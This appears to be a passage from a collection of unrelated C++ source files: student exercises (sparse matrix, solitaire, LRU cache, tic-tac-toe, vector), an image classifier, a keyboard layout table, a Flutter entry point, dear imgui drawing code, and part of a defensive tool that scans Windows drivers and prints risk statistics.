(second) {\n            second->prev = first;\n        }\n    }\n\n    void insert_end(int value, int index) {\n        Node* item = new Node(index, value);\n        if (!head) {\n            head = tail = item;\n        } else {\n            link(tail, item);\n            tail = item;\n        }\n        elements++;\n    }\n\n    void insert_front(int value, int index) {\n        Node* item = new Node(index, value);\n        if (!head) {\n            head = tail = item;\n        } else {\n            link(item, head);\n            head = item;\n        }\n        elements++;\n    }\n\n    Node *add_after(Node *before, int value, int index) {\n        Node *middle = new Node(index, value);\n        elements++;\n        if (!before) {\n            insert_front(value, index);\n            return head;\n        }\n        Node *after = before->next;\n        link(before, middle);\n        link(middle, after);\n        \n        if (!after)\n            tail = middle;\n        return middle;\n    }\n\n    void insert_sort(int value, int index) {\n        if (!head || index < head->index)\n            insert_front(value, index);\n        else if (index > tail->index)\n            insert_end(value, index);\n        else {\n            Node *cur = head;\n            while (cur && cur->index < index)\n                cur = cur->next;\n            add_after(cur->prev, value, index);\n        }\n    }\n\n    void setValue(int value, int index) {\n        if (index < 0 || index >= size) {\n            cout << \"Index out of bounds\" << endl;\n            return;\n        }\n        insert_sort(value, index);\n    }\n\n    void printArray() {\n        Node* cur = head;\n        int currentIndex = 0;\n        while (cur) {\n            while (currentIndex < cur->index) {\n                cout << \"0 \";\n                currentIndex++;\n            }\n            cout << cur->data << \" \";\n            currentIndex++;\n            cur = cur->next;\n        }\n        while (currentIndex < size) {\n            cout << \"0 \";\n            currentIndex++;\n        }\n        cout << endl;\n    }\n\n    void printWithoutZeros() {\n        Node* cur = head;\n        while (cur) {\n            cout << cur->data;\n            if (cur != tail) {\n                cout << \" \";\n            }\n            cur = cur->next;\n        }\n        cout << endl;\n    }\n\n    int getValue(int index) {\n        if (index < 0 || index >= size) {\n            cout << \"Index out of bounds\" << endl;\n            return 0;\n        }\n        Node *node = getIndex(index, false);\n        return node ? node->data : 0;\n    }\n\n    void add(ArrayDoubleLinkedList &other) {\n        assert(size == other.size);\n        Node *cur = other.head;\n        while (cur) {\n            setValue(getValue(cur->index) + cur->data, cur->index);\n            cur = cur->next;\n        }\n    }\n\n    void addition(ArrayDoubleLinkedList *list) {\n        Node *cur1 = head;\n        Node *cur2 = list->head;\n\n        while (cur2) {\n            while (cur1 && cur1->index < cur2->index) {\n                cur1 = cur1->next;\n            }\n            if (cur1 && cur1->index == cur2->index) {\n                cur1->data += cur2->data;\n                cur2 = cur2->next;\n            } else {\n                setValue(cur2->data, cur2->index);\n                cur2 = cur2->next;\n            }\n        }\n    }\n};\n\nclass Nodem {\npublic:\n    int index;\n    Nodem *next;\n    ArrayDoubleLinkedList* list;\n    Nodem(int index, int cols) : index(index), next(nullptr), list(new ArrayDoubleLinkedList(cols)) {}\n};\n\nclass SparceMatrix {\nprivate:\n    int rows;\n    int cols;\n    Nodem* head;\n\npublic:\n    SparceMatrix(int rows, int cols) : rows(rows), cols(cols), head(nullptr) {}\n\n    ~SparceMatrix() {\n        Nodem* cur = head;\n        while (cur) {\n            delete cur->list;\n            Nodem* nextNode = cur->next;\n            delete cur;\n      ",
    "\r\n#include <iostream>\r\n#include \"Deck.h\"\r\nusing namespace std;\r\n\r\nint GetMenuSelection(string prompt, int minimumS, int maximumS);\r\nbool playFibo(Deck deck);\r\nbool isFibo(int fiboNumber);\r\n\r\nint main()\r\n{\r\n    Deck deck = Deck();\r\n\r\n    bool gameIsRunning = true;\r\n    while (gameIsRunning)\r\n    {\r\n        string menuPrompt = \"Welcome to Fibonacci Solitaire!\\n\"\r\n                            \"Select an option...\\n\"\r\n                            \"1. Create New Deck\\n\"\r\n                            \"2. Display Deck\\n\"\r\n                            \"3. Shuffle Deck\\n\"\r\n                            \"4. Play Fibo Solitaire\\n\"\r\n                            \"5. Win Fibo Solitaire\\n\"\r\n                            \"6. Exit\\n\"\r\n                            \"Selection: \";\r\n        int menuSelection = GetMenuSelection(menuPrompt, 1, 6);\r\n\r\n        cout << endl;\r\n\r\n        if (menuSelection == 1) // Create New Deck\r\n            deck.newDeck();\r\n\r\n        if (menuSelection == 2) // Shuffle Deck\r\n            deck.show();\r\n\r\n        if (menuSelection == 3) // Display Deck\r\n            deck.shuffle();\r\n\r\n        if (menuSelection == 4) // Play Fibo Solitaire\r\n            playFibo(deck);\r\n\r\n        if (menuSelection == 5) // Win Fibo Solitaire (Keep playing Fibo until a win)\r\n        {\r\n            int gameCount = 1;\r\n\r\n            while (!playFibo(deck)) // PlayFibo returns a boolean that shows whether or not the game was won, therefore, while (not Won)\r\n            {\r\n                gameCount += 1;\r\n                deck.shuffle();\r\n\r\n                cout << \"\\nShuffling for next game...\\n\"\r\n                     << endl;\r\n            }\r\n            cout << endl;\r\n            cout << \"Games Played : \" << gameCount << endl;\r\n            cout << endl;\r\n        }\r\n\r\n        if (menuSelection == 6) // Exit\r\n            gameIsRunning = false;\r\n\r\n        cout << endl;\r\n    }\r\n}\r\n\r\nint GetMenuSelection(string prompt, int minimumS, int maximumS) // Receives menu selection\r\n{\r\n    bool inputVal = false;\r\n\r\n    while (!inputVal)\r\n    {\r\n        cout << prompt; \r\n        string latestInputString;\r\n        cin >> latestInputString; \r\n\r\n        bool inputOnlyContainsInts = true;\r\n        for (int charIndex = 0; charIndex < latestInputString.length(); charIndex++){\r\n            char loopChar = latestInputString[charIndex];\r\n            if (!isdigit(loopChar)){\r\n                inputOnlyContainsInts = false;\r\n            }\r\n        }\r\n\r\n        bool inputIsWithinRange = false;\r\n        if (inputOnlyContainsInts){\r\n            int inputAsInt = stoi(latestInputString);\r\n            if ((minimumS <= inputAsInt) && (inputAsInt <= maximumS)){\r\n                return inputAsInt;\r\n            }\r\n        }\r\n        cout << \"\\nNot a valid selection.\\n\" << endl; \r\n    }\r\n    return 0;\r\n}\r\n\r\nbool playFibo(Deck deck) //will play the game.\r\n{\r\n    bool isWinner = false;\r\n    int pileSum = 0;\r\n    int numberOfPiles = 0;\r\n\r\n    while (!deck.isEmpty())\r\n    {\r\n        Card drawnCard = deck.deal();\r\n        pileSum += drawnCard.getValue();\r\n        drawnCard.show();\r\n        cout << \", \";\r\n\r\n        if (isFibo(pileSum)){\r\n            cout << \"Fibo : \" << pileSum << endl;\r\n            pileSum = 0;\r\n            numberOfPiles += 1;\r\n        }\r\n    }\r\n\r\n    if (pileSum == 0){\r\n        isWinner = true;\r\n    }\r\n\r\n    if (!isWinner){\r\n        cout << \"Last Pile NOT Fibo : \" << pileSum << endl;\r\n        cout << endl;\r\n        numberOfPiles += 1;\r\n    }\r\n\r\n    if (isWinner)\r\n        cout << \"Winner\";\r\n    else\r\n        cout << \"Loser\";\r\n    cout << \" in \" << numberOfPiles << \" piles!\" << endl;\r\n\r\n    return isWinner;\r\n}\r\n\r\nbool isFibo(int fiboNumber) // Checks to find if the value is the Fibo number.\r\n{\r\n    vector <int> fiboList = {1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377};\r\n    for (int fiboNumberIndex = 0; fiboNumberIndex < 13; fiboNumberIndex++){\r\n        if (fiboNumber == fiboList[fiboNumberIndex])\r\n            return true;\r\n    }\r\n    return false;\r\n}",
    "#include <iostream>\n#include \"dcmtk/dcmdata/dctk.h\"\n#include \"dcmtk/dcmimgle/dcmimage.h\"\n#include <opencv2/opencv.hpp>\n#include \"Image.h\"\n#include \"Globals.h\"\n#include \"Classifier.h\"\n#include <cstdlib> // For system()\n\nint main()\n{\n    const std::string train_data_directory = \"bodyparts-train-data\"; // Fixed directory for training data\n    const std::string test_data_directory = \"bodyparts-test-data\"; // Fixed directory for test data\n    const std::string train_classification_file = \"train_classication.csv\"; // csv with classication for test data\n    const std::string test_classification_file = \"test_filenames.csv\"; // csv with classication for test data\n    const std::string images_dir = \"images\"; // Fixed directory for test images\n    const std::string dicom_images_dir = \"dicom-images\"; // Fixed directory for test images\n\n    std::vector<cv::Mat> images, trainImages, testImages;\n    std::vector<int> labels, trainLabels, testLabels;\n\n    // Load data from the specified directory\n    build_data_class_ID_map(train_classification_file);\n    load_data(train_data_directory, images, labels);\n\n    // Split data into training and testing sets\n    split_data(images, labels, trainImages, trainLabels, testImages, testLabels);\n\n    // Check if any images were loaded\n    if (trainImages.empty() || testImages.empty()) {\n        std::cerr << \"Error: No images loaded from directory!\" << std::endl;\n        return -1;\n    }\n\n    //Prepare PNG images from test DCM images\n    convertDcmUsingCommandLine(dicom_images_dir);\n\n    std::cout << \"\\n=== SVM MODEL ===\\n\";\n    train_model(trainImages, trainLabels, ModelType::SVM);\n    evaluate_model(testImages, testLabels, ModelType::SVM);\n    make_predictions_on_loaded_set(images, labels, NUM_PREDICT_CASES, ModelType::SVM);\n    make_predictions_on_test_cases(images_dir, ModelType::SVM);\n    make_predictions_on_test_cases(dicom_images_dir + \"/temp\", ModelType::SVM);\n    \n    std::cout << \"\\n=== KNN MODEL ===\\n\";\n    train_model(trainImages, trainLabels, ModelType::KNN);\n    evaluate_model(testImages, testLabels, ModelType::KNN);\n    make_predictions_on_loaded_set(images, labels, NUM_PREDICT_CASES, ModelType::KNN);\n    make_predictions_on_test_cases(images_dir, ModelType::KNN);\n    make_predictions_on_test_cases(dicom_images_dir + \"/temp\", ModelType::SVM);\n\n}\n\n",
    "/*\n * Spanish keyboard layout.\n */\n\n#include \"KeyboardLayout.h\"\n\nextern const uint8_t KeyboardLayout_es_ES[128] PROGMEM =\n{\n\t0x00,          // NUL\n\t0x00,          // SOH\n\t0x00,          // STX\n\t0x00,          // ETX\n\t0x00,          // EOT\n\t0x00,          // ENQ\n\t0x00,          // ACK\n\t0x00,          // BEL\n\t0x2a,          // BS  Backspace\n\t0x2b,          // TAB Tab\n\t0x28,          // LF  Enter\n\t0x00,          // VT\n\t0x00,          // FF\n\t0x00,          // CR\n\t0x00,          // SO\n\t0x00,          // SI\n\t0x00,          // DEL\n\t0x00,          // DC1\n\t0x00,          // DC2\n\t0x00,          // DC3\n\t0x00,          // DC4\n\t0x00,          // NAK\n\t0x00,          // SYN\n\t0x00,          // ETB\n\t0x00,          // CAN\n\t0x00,          // EM\n\t0x00,          // SUB\n\t0x00,          // ESC\n\t0x00,          // FS\n\t0x00,          // GS\n\t0x00,          // RS\n\t0x00,          // US\n\n\t0x2c,          // ' '\n\t0x1e|SHIFT,    // !\n\t0x1f|SHIFT,    // \"\n\t0x20|ALT_GR,   // #\n\t0x21|SHIFT,    // $\n\t0x22|SHIFT,    // %\n\t0x23|SHIFT,    // &\n\t0x2d,          // '\n\t0x25|SHIFT,    // (\n\t0x26|SHIFT,    // )\n\t0x30|SHIFT,    // *\n\t0x30,          // +\n\t0x36,          // ,\n\t0x38,          // -\n\t0x37,          // .\n\t0x24|SHIFT,    // /\n\t0x27,          // 0\n\t0x1e,          // 1\n\t0x1f,          // 2\n\t0x20,          // 3\n\t0x21,          // 4\n\t0x22,          // 5\n\t0x23,          // 6\n\t0x24,          // 7\n\t0x25,          // 8\n\t0x26,          // 9\n\t0x37|SHIFT,    // :\n\t0x36|SHIFT,    // ;\n\t0x32,          // <\n\t0x27|SHIFT,    // =\n\t0x32|SHIFT,    // >\n\t0x2d|SHIFT,    // ?\n\t0x1f|ALT_GR,   // @\n\t0x04|SHIFT,    // A\n\t0x05|SHIFT,    // B\n\t0x06|SHIFT,    // C\n\t0x07|SHIFT,    // D\n\t0x08|SHIFT,    // E\n\t0x09|SHIFT,    // F\n\t0x0a|SHIFT,    // G\n\t0x0b|SHIFT,    // H\n\t0x0c|SHIFT,    // I\n\t0x0d|SHIFT,    // J\n\t0x0e|SHIFT,    // K\n\t0x0f|SHIFT,    // L\n\t0x10|SHIFT,    // M\n\t0x11|SHIFT,    // N\n\t0x12|SHIFT,    // O\n\t0x13|SHIFT,    // P\n\t0x14|SHIFT,    // Q\n\t0x15|SHIFT,    // R\n\t0x16|SHIFT,    // S\n\t0x17|SHIFT,    // T\n\t0x18|SHIFT,    // U\n\t0x19|SHIFT,    // V\n\t0x1a|SHIFT,    // W\n\t0x1b|SHIFT,    // X\n\t0x1c|SHIFT,    // Y\n\t0x1d|SHIFT,    // Z\n\t0x2f|ALT_GR,   // [\n\t0x35|ALT_GR,   // bslash\n\t0x30|ALT_GR,   // ]\n\t0x00,          // ^  not supported (requires dead key + space)\n\t0x38|SHIFT,    // _\n\t0x00,          // `  not supported (requires dead key + space)\n\t0x04,          // a\n\t0x05,          // b\n\t0x06,          // c\n\t0x07,          // d\n\t0x08,          // e\n\t0x09,          // f\n\t0x0a,          // g\n\t0x0b,          // h\n\t0x0c,          // i\n\t0x0d,          // j\n\t0x0e,          // k\n\t0x0f,          // l\n\t0x10,          // m\n\t0x11,          // n\n\t0x12,          // o\n\t0x13,          // p\n\t0x14,          // q\n\t0x15,          // r\n\t0x16,          // s\n\t0x17,          // t\n\t0x18,          // u\n\t0x19,          // v\n\t0x1a,          // w\n\t0x1b,          // x\n\t0x1c,          // y\n\t0x1d,          // z\n\t0x34|ALT_GR,   // {\n\t0x1e|ALT_GR,   // |\n\t0x31|ALT_GR,   // }\n\t0x00,          // ~  not supported (requires dead key + space)\n\t0x00           // DEL\n};\n",
    "#include <iostream>\r\n#include <string>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\ntemplate<typename T> \r\nclass SimpleVector\r\n{\r\nprivate:\r\n\tT* data;\r\n\tint currentSize = 0;\r\n\tint currentCapacity = 0;\r\n\r\npublic:\r\n\tSimpleVector(int capacity = 10)\r\n\t{\r\n\t\tdata = new T[capacity];\r\n\t\tcurrentSize = 0;\r\n\t\tcurrentCapacity = capacity;\r\n\t}\r\n\tSimpleVector(const SimpleVector& other)\r\n\t{\r\n\t\tcurrentCapacity = other.currentCapacity;\r\n\t\tcurrentSize = other.currentSize;\r\n\t\tdata = new T[other.currentCapacity];\r\n\t\tfor (int i = 0; i < currentCapacity; i++)\r\n\t\t{\r\n\t\t\tdata[i] = other.data[i];\r\n\t\t}\r\n\t}\r\n\t~SimpleVector()\r\n\t{\r\n\t\tdelete[] data;\r\n\t}\r\n\r\n#pragma region printData\r\n\t////////////////////////////////////////////////////\r\n\t/////////////////\u00b9\u00e8\u00bf\u00ad \u00b3\u00bb \u00bf\u00f8\u00bc\u00d2 \u00c8\u00ae\u00c0\u00ce\u00bf\u00eb////////////////\r\n\t////////////////////////////////////////////////////\r\n\tT getData(int i) const\r\n\t{\r\n\t\treturn data[i];\r\n\t}\r\n#pragma endregion \r\n\t\r\n\r\n\tvoid resize(int newCapacity)\r\n\t{\r\n\t\tif (currentCapacity < newCapacity)\r\n\t\t{\r\n\t\t\tint temp = currentSize;\r\n\t\t\tcurrentCapacity = newCapacity;\r\n\t\t\tT* arr = new T[newCapacity];\r\n\t\t\tfor (int i = 0; i < temp; i++)\r\n\t\t\t{\r\n\t\t\t\tarr[i] = data[i];\r\n\t\t\t}\r\n\t\t\tdelete[] data;\r\n\t\t\tdata = arr;\r\n\t\t}\r\n\t\t\t\r\n\t}\r\n\tvoid push_back(const T& value)\r\n\t{\r\n\t\tif (currentSize < currentCapacity)\r\n\t\t{\r\n\t\t\tdata[currentSize] = value;\r\n\t\t\tcurrentSize++;\r\n\t\t}\r\n\t}\r\n\tvoid pop_back()\r\n\t{\r\n\t\tif (currentSize > 0)\r\n\t\t{\r\n\t\t\tcurrentSize--;\r\n\t\t}\r\n\t}\r\n\tint size() const\r\n\t{\r\n\t\treturn currentSize;\r\n\t}\r\n\tint capacity() const\r\n\t{\r\n\t\treturn currentCapacity;\r\n\t}\r\n\tvoid sortData()\r\n\t{\r\n\t\tsort(data, data + currentSize);\r\n\t}\r\n};\r\n\r\n\r\n\r\nint main() \r\n{\r\n\r\n\tSimpleVector<int> s(10);\r\n\t\r\n\ts.push_back(5);\r\n\ts.push_back(3);\r\n\ts.push_back(4);\r\n\ts.pop_back();\r\n\ts.pop_back();\r\n\ts.push_back(7);\r\n\ts.push_back(1);\r\n\r\n\r\n\tfor (int i = 0; i < 10; i++)\r\n\t{\r\n\t\ts.push_back(1);\r\n\t}\r\n\tfor (int i = 0; i < 20; i++)\r\n\t{\r\n\t\ts.pop_back();\r\n\t}\r\n\r\n\ts.resize(15);\r\n\tfor (int i = 0; i < 20; i++)\r\n\t{\r\n\t\ts.push_back(10);\r\n\t}\r\n\t\r\n\tfor (int i = 0; i < s.size(); i++)\r\n\t{\r\n\t\tcout << s.getData(i) << \" \";\r\n\t}\r\n\tcout << endl;\r\n\tfor (int i = 0; i < 20; i++)\r\n\t{\r\n\t\ts.pop_back();\r\n\t}\r\n\tfor (int i = 0; i < s.size(); i++)\r\n\t{\r\n\t\tcout << s.getData(i) << \" \";\r\n\t}\r\n\tcout << endl;\r\n\r\n\ts.push_back(10);\r\n\ts.push_back(11);\r\n\ts.push_back(9);\r\n\ts.sortData();\r\n\tSimpleVector<int> s2(s);\r\n\tfor (int i = 0; i < s2.size(); i++)\r\n\t{\r\n\t\tcout << s2.getData(i) << \" \";\r\n\t}\r\n}",
    "#include \"driver_scanner.hpp\"\n#include <iostream>\n#include <iomanip>\n#include <vector>\n#include <conio.h>\n#include <fcntl.h>\n#include <io.h>\n#include <fstream>\n#include <map>\n#include <algorithm>\n\n// Helper function for safe string conversion\nstd::string wstring_to_string(const std::wstring& wstr) {\n    if (wstr.empty()) return std::string();\n    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);\n    std::string str(size_needed, 0);\n    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &str[0], size_needed, NULL, NULL);\n    return str;\n}\n\nvoid clearScreen() {\n    system(\"cls\");\n}\n\nvoid printHeader() {\n    std::cout << \"=================================================\\n\";\n    std::cout << \"        Advanced Vulnerable Driver Scanner        \\n\";\n    std::cout << \"=================================================\\n\\n\";\n}\n\nvoid printDebugInfo(const std::string& message) {\n    std::cout << \"[DEBUG] \" << message << \"\\n\";\n}\n\nstd::string formatFileTime(const FILETIME& ft) {\n    SYSTEMTIME st;\n    FileTimeToSystemTime(&ft, &st);\n\n    char buffer[100];\n    sprintf_s(buffer, sizeof(buffer), \"%02d/%02d/%d %02d:%02d:%02d\",\n        st.wMonth, st.wDay, st.wYear,\n        st.wHour, st.wMinute, st.wSecond);\n    return std::string(buffer);\n}\n\nvoid printDetailedScanSummary(const std::vector<DriverScanner::DriverInfo>& drivers) {\n    int totalDrivers = drivers.size();\n    int unsignedCount = 0;\n    int rwCapableCount = 0;\n    int killCapableCount = 0;\n    int registryCapableCount = 0;\n    int fsCapableCount = 0;\n    int networkCapableCount = 0;\n    int highRiskCount = 0;\n    int criticalRiskCount = 0;\n\n    for (const auto& driver : drivers) {\n        if (!driver.isSignedByCertificate) unsignedCount++;\n        if (driver.hasReadWriteCapability) rwCapableCount++;\n        if (driver.hasKillProcessCapability) killCapableCount++;\n        if (driver.hasRegistryCapability) registryCapableCount++;\n        if (driver.hasFileSystemCapability) fsCapableCount++;\n        if (driver.hasNetworkCapability) networkCapableCount++;\n\n        // Calculate risk for statistics\n        int risk = 0;\n        if (!driver.isMicrosoftSigned) risk += 2;\n        if (!driver.isSignedByCertificate) risk += 3;\n        if (driver.hasReadWriteCapability) risk += 3;\n        if (driver.hasKillProcessCapability) risk += 3;\n        if (driver.hasRegistryCapability) risk += 1;\n        if (driver.hasFileSystemCapability) risk += 1;\n        if (driver.hasNetworkCapability) risk += 1;\n        if (!driver.detectedVulnerabilities.empty()) {\n            int vulnCount = static_cast<int>(driver.detectedVulnerabilities.size());\n            risk += (vulnCount > 5) ? 5 : vulnCount;\n        }\n\n        if (risk >= 15) criticalRiskCount++;\n        else if (risk >= 10) highRiskCount++;\n    }\n\n    std::cout << \"\\n=== DETAILED SCAN SUMMARY ===\\n\";\n    std::cout << \"Total Drivers Scanned: \" << totalDrivers << \"\\n\";\n    std::cout << \"\\nSIGNATURE STATUS:\\n\";\n    std::cout << \"- Unsigned Drivers: \" << unsignedCount << \" (\"\n        << (totalDrivers ? (unsignedCount * 100 / totalDrivers) : 0) << \"%)\\n\";\n\n    std::cout << \"\\nCAPABILITY ANALYSIS:\\n\";\n    std::cout << \"- Memory R/W Capable: \" << rwCapableCount << \" (\"\n        << (totalDrivers ? (rwCapableCount * 100 / totalDrivers) : 0) << \"%)\\n\";\n    std::cout << \"- Process Kill Capable: \" << killCapableCount << \" (\"\n        << (totalDrivers ? (killCapableCount * 100 / totalDrivers) : 0) << \"%)\\n\";\n    std::cout << \"- Registry Access: \" << registryCapableCount << \" (\"\n        << (totalDrivers ? (registryCapableCount * 100 / totalDrivers) : 0) << \"%)\\n\";\n    std::cout << \"- FileSystem Access: \" << fsCapableCount << \" (\"\n        << (totalDrivers ? (fsCapableCount * 100 / totalDrivers) : 0) << \"%)\\n\";\n    std::cout << \"- Network Capable: \" << networkCapableCount << \" (\"\n        << (totalDrivers ? (networkCapableCount * 100 / totalDrivers) : 0) << \"%)\\n\";\n\n    std::cout << \"\\nRISK DISTRIBUTION:\\n\";\n    std::cout << \"- Critical Risk: \" << criticalRiskCount << \" (\"\n        << (totalDrivers ? (criticalRiskCount * 100 / totalDrivers) : 0) << \"%)\\n\";\n    std::cout << \"- High Risk: \" << highRiskCount << \" (\"\n        << (totalDrivers ? (highRiskCount * 100 / totalDrivers) : 0) << \"%)\\n\";\n}\n\nvoid printDriverInfo(const DriverScanner::DriverInfo& driver, bool detailed = false) {\n    std::wcout << L\"\\nDriver: \" << driver.name;\n    if (!driver.vendor.empty()) {\n        std::wcout << L\" (by \" << driver.vendor << L\")\";\n    }\n    std::wcout << L\"\\n\";\n\n    std::wcout << L\"Version: \" << (!driver.version.empty() ? driver.version : L\"Unknown\") << L\"\\n\";\n    std::wcout << L\"Path: \" << driver.path << L\"\\n\";\n    std::wcout << L\"Hash: \" << driver.hash << L\"\\n\";\n\n    // Signature information\n    std::cout << \"Signature Status: \";\n    if (driver.isMicrosoftSigned) {\n        std::cout << \"Microsoft Signed (TRUSTED)\\n\";\n    }\n    else if (driver.isSignedByCertificate) {\n        std::cout << \"Third-party Signed (VE",
    "//{ Driver Code Starts\n#include <bits/stdc++.h>\nusing namespace std;\n\n\n// } Driver Code Ends\n// design the class in the most optimal way\n\nclass LRUCache {\n  private:\n  int capacity;\n  list<pair<int,int>> cache;\n  unordered_map<int,list<pair<int,int>> ::iterator> map;\n  public:\n    // Constructor for initializing the cache capacity with the given value.\n    LRUCache(int cap) {\n        // code here\n        capacity = cap;\n        \n        \n    }\n\n    // Function to return value corresponding to the key.\n    int get(int key) {\n        // your code here\n        if(map.find(key) == map.end()) return -1;\n        auto it = map[key];\n        int value = it->second;\n        cache.erase(it);\n        cache.push_front({key,value});\n        map[key] = cache.begin();\n        return value;\n    }\n\n    // Function for storing key-value pair.\n    void put(int key, int value) {\n        // your code here\n        if(map.find(key) != map.end()){\n            auto it = map[key];\n            cache.erase(it);\n        }else if(cache.size() == capacity){\n            auto lru = cache.back();\n            map.erase(lru.first);\n            cache.pop_back();\n        }\n        cache.push_front({key , value});\n        map[key] = cache.begin();\n        \n        \n        \n    }\n};\n\n//{ Driver Code Starts.\n\nint main() {\n    int t;\n    cin >> t;\n    while (t--) {\n\n        int capacity;\n        cin >> capacity;\n        LRUCache *cache = new LRUCache(capacity);\n\n        int queries;\n        cin >> queries;\n        while (queries--) {\n            string q;\n            cin >> q;\n            if (q == \"PUT\") {\n                int key;\n                cin >> key;\n                int value;\n                cin >> value;\n                cache->put(key, value);\n            } else {\n                int key;\n                cin >> key;\n                cout << cache->get(key) << \" \";\n            }\n        }\n        cout << endl;\n        cout << \"~\" << endl;\n    }\n    return 0;\n}\n\n// } Driver Code Ends",
    "#include <iostream>\nusing namespace std;\n\nvoid DrawBoard(char array[3][3])\n{\n    cout << endl;\n    int index1 = 0;\n    int index2 = -1;\n    for (int i = 0; i < 7; i++)\n    {\n        for (int j = 0; j < 4; j++)\n        {\n            if (!(i % 2))\n            {\n                cout << \"---\";\n            }\n            else if (j < 3)\n            {\n\n                if (index2 == 2)\n                {\n                    index1++;\n                    index2 = 0;\n                }\n                else\n                {\n                    index2++;\n                }\n                cout << \"| \" << array[index1][index2] << \" \";\n            }\n            else\n            {\n                cout << \"|\";\n            }\n        }\n        cout << endl;\n    }\n}\nchar CheckWin(char array[3][3])\n{\n    if (array[0][0] == array[1][1] && array[1][1] == array[2][2] && array[0][0] != ' ')\n    {\n        return array[0][0];\n    }\n    if (array[0][2] == array[1][1] && array[1][1] == array[2][0] && array[0][2] != ' ')\n    {\n        return array[0][2];\n    }\n    for (int i = 0; i < 3; i++)\n    {\n        if (array[i][0] == array[i][1] && array[i][1] == array[i][2] && array[i][0] != ' ')\n        {\n            return array[i][0];\n        }\n    }\n    for (int i = 0; i < 3; i++)\n    {\n        if (array[0][i] == array[1][i] && array[1][i] == array[2][i] && array[0][i] != ' ')\n        {\n            return array[0][i];\n        }\n    }\n    return ' ';\n}\nvoid main()\n{\n    char array[3][3];\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            array[i][j] = ' ';\n        }\n    }\n    DrawBoard(array);\n    bool isX = true;\n    int count = 0;\n    char gameOver = ' ';\n    do\n    {\n        cout << \"Which Block: \";\n        int x, y;\n        cin >> x >> y;\n        while (array[x][y] != ' ')\n        {\n            cout << \"Filled Bloack!\" << endl;\n            cin >> x >> y;\n        }\n        if (isX)\n        {\n            array[x][y] = 'X';\n        }\n        else\n        {\n            array[x][y] = 'O';\n        }\n        count++;\n        DrawBoard(array);\n        gameOver = CheckWin(array);\n        if (gameOver == ' ' && count == 9)\n        {\n            cout << \"Game Over! No One Won!\" << endl;\n            break;\n        }\n        isX = !isX;\n    } while (gameOver == ' ');\n\n    if (gameOver == 'X')\n        cout << \"X Won!\" << endl;\n    else if (gameOver == 'O')\n        cout << \"O Won!\" << endl;\n\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"i_am_rich\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui, v1.91.7 WIP\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImTriangulator, ImDrawList concave polygon fill\n// [SECTION] ImDrawListSplitter\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas: glyph ranges helpers\n// [SECTION] ImFontGlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] ImGui Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n#ifdef IMGUI_ENABLE_FREETYPE\n#include \"misc/freetype/imgui_freetype.h\"\n#endif\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3). [MSVC Static Analyzer)\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"            // warning: declaration requires a global destructor         // similar to above, not sure what the exact 